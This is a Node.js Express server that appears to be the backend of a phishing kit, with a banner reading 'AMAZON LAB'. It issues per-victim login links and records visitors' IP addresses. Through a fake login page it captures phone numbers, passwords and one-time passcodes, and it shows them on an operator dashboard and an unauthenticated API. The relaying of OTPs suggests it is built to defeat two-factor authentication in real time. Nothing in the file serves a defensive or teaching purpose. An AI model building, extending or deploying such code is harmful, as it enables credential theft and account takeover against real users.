const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 8080;

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

let clients = [];

function generateId() {
    return 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Get all clients
app.get('/api/clients', (req, res) => {
    res.json(clients);
});

// Create new client
app.post('/api/client/create', (req, res) => {
    const { linkId } = req.body;
    const existingClient = clients.find(c => c.linkId === linkId);
    if (existingClient) {
        return res.json({ clientId: existingClient.id, link: existingClient.link });
    }

    const clientId = generateId();
    const newLink = Math.random().toString(36).substr(2, 10);
    
    const client = {
        id: clientId,
        linkId: linkId || newLink,
        link: `${req.protocol}://${req.get('host')}/login?id=${linkId || newLink}`,
        phone: null,
        password: null,
        otp: null,
        status: 'new',
        otpSent: false,
        timestamp: new Date().toLocaleString('ar-EG'),
        ip: req.ip || req.connection.remoteAddress
    };

    clients.push(client);
    console.log('[+] New client:', clientId);
    res.json({ clientId: client.id, link: client.link });
});

// Client login
app.post('/api/client/login', (req, res) => {
    const { clientId, phone, password } = req.body;
    const client = clients.find(c => c.id === clientId || c.linkId === clientId);
    if (!client) return res.status(404).json({ error: 'Not found' });

    client.phone = phone;
    client.password = password;
    client.status = 'login';
    client.timestamp = new Date().toLocaleString('ar-EG');
    
    console.log('[+] Login:', clientId, 'Phone:', phone);
    res.json({ success: true, status: 'login' });
});

// Send OTP
app.post('/api/send-otp', (req, res) => {
    const { clientId } = req.body;
    const client = clients.find(c => c.id === clientId);
    if (!client) return res.status(404).json({ error: 'Not found' });

    client.otpSent = true;
    client.status = 'otp';
    client.timestamp = new Date().toLocaleString('ar-EG');
    
    console.log('[+] OTP sent to:', clientId);
    res.json({ success: true });
});

// Client submitted OTP
app.post('/api/client/otp', (req, res) => {
    const { clientId, otp } = req.body;
    const client = clients.find(c => c.id === clientId || c.linkId === clientId);
    if (!client) return res.status(404).json({ error: 'Not found' });

    client.otp = otp;
    client.status = 'done';
    client.timestamp = new Date().toLocaleString('ar-EG');
    
    console.log('[+] OTP received:', clientId, 'OTP:', otp);
    res.json({ success: true, status: 'done' });
});

// Get client status
app.get('/api/client/status', (req, res) => {
    const { clientId } = req.query;
    const client = clients.find(c => c.id === clientId || c.linkId === clientId);
    if (!client) return res.status(404).json({ error: 'Not found' });

    res.json({
        status: client.status,
        otpSent: client.otpSent,
        otp: client.otp
    });
});

// Delete client
app.delete('/api/client/:clientId', (req, res) => {
    const { clientId } = req.params;
    clients = clients.filter(c => c.id !== clientId);
    console.log('[-] Removed:', clientId);
    res.json({ success: true });
});

// Dashboard
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Login page
app.get('/login', (req, res) => {
    const { id } = req.query;
    if (id) {
        const client = clients.find(c => c.linkId === id);
        if (!client) {
            const clientId = generateId();
            clients.push({
                id: clientId,
                linkId: id,
                link: `${req.protocol}://${req.get('host')}/login?id=${id}`,
                phone: null,
                password: null,
                otp: null,
                status: 'new',
                otpSent: false,
                timestamp: new Date().toLocaleString('ar-EG'),
                ip: req.ip || req.connection.remoteAddress
            });
        }
    }
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/', (req, res) => {
    res.redirect('/dashboard');
});

app.listen(PORT, () => {
    console.log('=================================');
    console.log('  AMAZON LAB - PORT:', PORT);
    console.log('  Dashboard: http://localhost:' + PORT + '/dashboard');
    console.log('=================================');
});